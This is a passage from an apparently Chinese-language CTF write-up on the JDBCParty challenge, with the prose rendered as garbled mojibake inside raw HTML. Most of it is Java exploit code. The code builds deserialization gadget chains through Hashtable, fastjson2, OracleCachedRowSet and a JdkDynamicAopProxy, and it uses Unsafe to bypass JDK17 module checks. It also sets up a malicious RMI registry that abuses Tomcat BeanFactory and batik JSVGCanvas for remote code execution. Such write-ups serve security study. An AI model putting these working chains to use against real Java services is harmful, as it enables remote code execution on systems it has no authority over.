       <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(pojoNode);<br>        setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        System.out.println(base64Encode(serialize(list)));<br><br>        deserialize(serialize(list));<br><br>    &#125;<br>    <br>    <span class="hljs-comment">//HashMapæ‰“Springçš„åŸç”ŸtoStringé“¾</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object v1, Object v2 )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br></code></pre></td></tr></table></figure><p>UnSafeToolsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSafeTools</span> &#123;<br>    <span class="hljs-keyword">static</span> Unsafe unsafe;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UnSafeTools</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        unsafe = (Unsafe)field.get((Object)<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> unsafe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setObject</span><span class="hljs-params">(Object o, Field field, Object value)</span> &#123;<br>        unsafe.putObject(o, unsafe.objectFieldOffset(field), value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newClass</span><span class="hljs-params">(Class c)</span> <span class="hljs-keyword">throws</span> InstantiationException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(c);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bypassModule</span><span class="hljs-params">(Class src, Class dst)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getModule</span> <span class="hljs-operator">=</span> dst.getDeclaredMethod(<span class="hljs-string">&quot;getModule&quot;</span>);<br>        getModule.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> getModule.invoke(dst);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.getAndSetObject(src, addr, <span class="hljs-keyword">module</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            unsafe = (Unsafe)field.get((Object)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var1) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Error: &quot;</span> + var1);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ç„¶<a href="https://xz.aliyun.com/news/16917?time__1311=eqUxnDRD0Dg0KAKDtD/Wn+xQw9AGrbqHq4D&u_atoken=f1b820af46009ed0c00f45f20fab3b16&u_asig=0a472f4317433405694282937e00b1">Hashtable</a>è¿™æ¡é“¾ï¼šä¹Ÿèƒ½é€šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">hashtable#readObject<br>=&gt;TextAndMnemonicHashMap#get<br>=&gt;fastjson2.toString<br>=&gt;OracleCachedRowSet.getConnection()<br></code></pre></td></tr></table></figure><p>åªä¸è¿‡è·ŸJacksonä¸ç¨³å®šé“¾æ˜¯ç±»ä¼¼çš„ï¼Œè¿˜éœ€è¦åŠ ä¸ª<code>JdkDynamicAopProxy</code>ç±»æŒ‡å®š<code>OracleCachedRowSet</code>çš„æ¥å£æ¥è¿›è¡Œå¯¹<code>getConnection</code>çš„ç¨³å®šè§¦å‘ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        unsafe_break_jdk17();<br>        <span class="hljs-comment">// sink</span><br>        <span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br>        oracleCachedRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://127.0.0.1:1097/remoteobj&quot;</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> getProxy(oracleCachedRowSet);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        objects.add(proxy);<br><br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashMapXStringToString</span> <span class="hljs-operator">=</span> makeTableTstring(objects);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">serialize</span> <span class="hljs-operator">=</span> serialize(hashMapXStringToString);<br><span class="hljs-comment">//            System.out.println(serialize);</span><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">deserialize</span> <span class="hljs-operator">=</span> deserialize(serialize);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unsafe_break_jdk17</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafe</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafe.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafe.get(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//è·å–Objectçš„module</span><br>        <span class="hljs-type">Module</span> <span class="hljs-variable">objectmodule</span> <span class="hljs-operator">=</span> Object.class.getModule();<br>        <span class="hljs-comment">//è·å–å½“å‰ç±»å¯¹è±¡</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">mainClass</span> <span class="hljs-operator">=</span> Exp_Hashtable.class;<br>        <span class="hljs-comment">//è·å–åœ¨classä¸­moduleçš„åç§»é‡</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        <span class="hljs-comment">//è®¾ç½®module</span><br>        unsafe.getAndSetObject(mainClass,<span class="hljs-keyword">module</span>,objectmodule);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(payload);<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String payload)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] data = Base64.getDecoder().decode(payload);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data)).readObject();<br>    &#125;<br>    <span class="hljs-comment">//åå°„æ”¹å€¼</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getSuperclass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;RowSetInternal.class&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxyObj;<br>    &#125;<br><br>    <span class="hljs-comment">//hashtable.readObject  ---&gt; TextAndMnemonicHashMap.get ----&gt; obj.toString</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTableTstring</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (HashMap) createWithoutConstructor(Class.forName(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (HashMap) createWithoutConstructor(Class.forName(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));<br>        tHashMap1.put(o,<span class="hljs-string">&quot;yy&quot;</span>);<br>        tHashMap2.put(o,<span class="hljs-string">&quot;zZ&quot;</span>);<br>        setValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>        setValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(tHashMap1,<span class="hljs-number">1</span>);<br>        hashtable.put(tHashMap2,<span class="hljs-number">1</span>);<br><br>        tHashMap1.put(o, <span class="hljs-literal">null</span>);<br>        tHashMap2.put(o, <span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> hashtable;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithoutConstructor</span><span class="hljs-params">(Class&lt;T&gt; classToInstantiate)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        <span class="hljs-keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithConstructor</span><span class="hljs-params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="hljs-built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;<br>        Constructor&lt;? <span class="hljs-built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);<br>        objCons.setAccessible(<span class="hljs-literal">true</span>);<br>        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);<br>        sc.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (T) sc.newInstance(consArgs);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="EXP-JNDI"><a href="#EXP-JNDI" class="headerlink" title="EXP-JNDI"></a>EXP-JNDI</h3><p>é¦–å…ˆæ˜¯æ³¨æ„åˆ°ä¾èµ–çš„tomcatæ˜¯10.1.31ï¼š</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331164726885.png" alt="image-20250331164726885"></p><p>è€ŒTomcat åœ¨<code>9.0.62</code>ååœ¨<code>BeanFactory</code>é‡Œå¯¹<code>forceString</code>è¿›è¡Œäº†åˆ¤æ–­ï¼Œæ‰€ä»¥æƒ³ç›´æ¥æ‰“<code>BeanFactory</code>çš„JNDIè€è·¯å·²ç»ä¸å¤ªå½³äºäº†ã€‚</p><p>æˆ‘ä»¬å¿…é¡»æ‰¾ä¸€ä¸ªæ–°çš„sinkç‚¹ï¼Œå¯çœ‹ï¼š<a href="https://xz.aliyun.com/news/16156?time__1311=eqUxnQiteDT4ulDl2mPuqg7DO8Cdx&u_atoken=377b40a8f18f8ba97d1e964e2cc03a6b&u_asig=0a472f8317434109012967899e0048">é«˜ç‰ˆæœ¬JNDIæ³¨å…¥-é«˜ç‰ˆæœ¬Tomcatåˆ©ç”¨æ–¹æ¡ˆ-å…ˆçŸ¥ç¤¾åŒº</a></p><p>ä½†æ˜¯æ–‡ç« çš„sinkç‚¹è¿™é“é¢˜ç”¨ä¸äº†emmmï¼Œè¿˜å¾—è‡ªå·±æ‰¾ä¸€ä¸ªã€‚</p><p>æ®è¯´å¯ä»¥ä»<code>RMIServer</code>æ‰“ä¸€ä¸ªXXEæ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰å°è¯•ï¼Œå› ä¸ºæˆ‘æƒ³Rå“ˆå“ˆå“ˆå“ˆå“ˆã€‚</p><p>é›†æ€å¹¿ç›Šï¼Œè¿˜çœŸæ‰¾åˆ°äº†ä¸€ä¸ª<a href="https://mp.weixin.qq.com/s/fZtDvpyAo-UZRE9MhfB0VQ">CVE-2022-39197åˆ†æ</a>ï¼Œè¿™æ˜¯ä¸€ä¸ªCSçš„æ´ï¼ŒSinkç‚¹æ˜¯<code>JSVGCanvas#setURL</code>ï¼Œæˆ‘ä»¬å¯ä»¥åšåˆ°svg2RCEã€‚</p><p>ä¹‹å‰è¯´åˆ°é«˜ç‰ˆæœ¬tomcatä¸èƒ½ç›´æ¥æ‰“<code>BeanFactory</code>å› ä¸º<code>forceString</code>è¢«banäº†ï¼Œä½†æ˜¯é€šè¿‡<code>JavaBeans Introspector</code> å®ç°è·å–ä»»æ„ç±»çš„beanä¹‹åï¼Œå°±å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„çš„setteræ–¹æ³•ã€‚</p><p>æˆ‘äº†ä¸ªè±†å•Šã€‚é‚£å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„setterä¼ å‚äº†ï¼Œé‚£ä¸å°±èƒ½è§¦å‘åˆ°<code>batik-swing</code>ä¸­<code>JSVGCanvas#setURL</code>äº†ï¼Œç›´æ¥å°±é€šäº†ã€‚</p><p>ï¼ˆsrdsè¿™ä¸ªbatik-swingç¡®å®æ˜¯è¿œå¤ç‰ˆæœ¬çš„ç©æ„ï¼Œè¿˜å¾—å»ç½‘ä¸Šä¸‹ï¼‰</p><p>ä¸æ­¤åŒæ—¶ï¼Œè¿™ä¸ªæ´åç»­è¿˜è¢«å‘æ‰¬å…‰å¤§äº†ï¼Œäºæ˜¯å°±æ‰¾åˆ°äº†CVE-2023-21939ï¼š<a href="https://mp.weixin.qq.com/s?__biz=MzkzOTQzOTE1NQ==&mid=2247483750&idx=1&sn=12a793075d0a8713bbfb4341b3591628&chksm=c2f1a43af5862d2cc898be9e4b43b24d24b29173501d3c10d812a8fcb7dd25d858e3095969ea#rd">JDK CVE-2023-21939 åˆ†æåˆ©ç”¨</a></p><h3 id="EXP-RMIServer"><a href="#EXP-RMIServer" class="headerlink" title="EXP_RMIServer"></a>EXP_RMIServer</h3><p>æ²¡å•¥å¥½è¯´çš„ï¼Œå°±æ˜¯æä¾›ä¸€ä¸ªæ‰“JNDIçš„RMIServerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer_JDBCParty</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;Creating evil RMI registry on port 1097&quot;</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1097</span>);<br><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.apache.batik.swing.JSVGCanvas&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;URI&quot;</span>, <span class="hljs-string">&quot;http://localhost:8886/1.xml&quot;</span>));<br><br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;remoteobj&quot;</span>, referenceWrapper); <span class="hljs-comment">//Clientå¤„è®¿é—®rmi://localhost:1097/remoteobj</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨CVE-2023-21939çš„ç°æˆserverç›´æ¥èµ·ï¼Œåªæ˜¯svgç›´æ¥è§¦å‘å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œæ‰“jaråŒ…çš„å½¢å¼å€’æ˜¯å¯ä»¥ä¸€éé€šï¼š</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331171010321.png" alt="image-20250331171010321"></p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331171039372.png" alt="image-20250331171039372"></p><p>å½“ç„¶è¿˜æœåˆ°æœ‰<code>Jackson+LdapAttruibute</code>çš„æ–¹æ³•èƒ½æ‰“ï¼Œå…·ä½“çœ‹çœ‹è¿™ä½å¸ˆå‚…å†™çš„å§ï¼š<a href="https://gsbp0.github.io/post/jdk17%E6%89%93jackson+ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JDK17æ‰“Jackson+LdapAttruibuteååºåˆ—åŒ– | GSBPâ€™s Blog</a></p><p>ä¸‰æŠ˜å ï¼Œæ€ä¹ˆæŠ˜éƒ½æœ‰é¢å•ŠğŸ˜‹ğŸ˜‹ğŸ˜‹</p><p>å‚è€ƒï¼š</p><p><a href="https://j1rry-learn.github.io/posts/%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E8%B5%9Bjdbcparty-%E5%AD%A6%E4%B9%A0%E9%AB%98%E7%89%88%E6%9C%ACjdk%E5%92%8C%E9%AB%98%E7%89%88%E6%9C%ACtomcat%E6%89%93jndi%E5%88%B0rce/#cve-2022-39197">ä»2025ç³»ç»Ÿå®‰å…¨é˜²æŠ¤èµ›JDBCPartyå­¦ä¹ é«˜ç‰ˆæœ¬JDKå’Œé«˜ç‰ˆæœ¬Tomcatæ‰“JNDIåˆ°RCE | J1rrYâ€™s Blog</a></p><p><a href="https://xz.aliyun.com/news/16917?time__1311=eqUxnDRD0Dg0KAKDtD/Wn+xQw9AGrbqHq4D&u_atoken=f1b820af46009ed0c00f45f20fab3b16&u_asig=0a472f4317433405694282937e00b1">è½¯ä»¶æ”»é˜²èµ›JDBCPartyèµ›åè§£-å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://github.com/Y4Sec-Team/CVE-2023-21939/tree/main">Y4Sec-Team&#x2F;CVE-2023-21939: JDK CVE-2023-21939</a></p><h1 id="å…¶äºŒ-è½¯ä»¶å®‰å…¨èµ›åŠå†³-justDeserialize"><a href="#å…¶äºŒ-è½¯ä»¶å®‰å…¨èµ›åŠå†³-justDeserialize" class="headerlink" 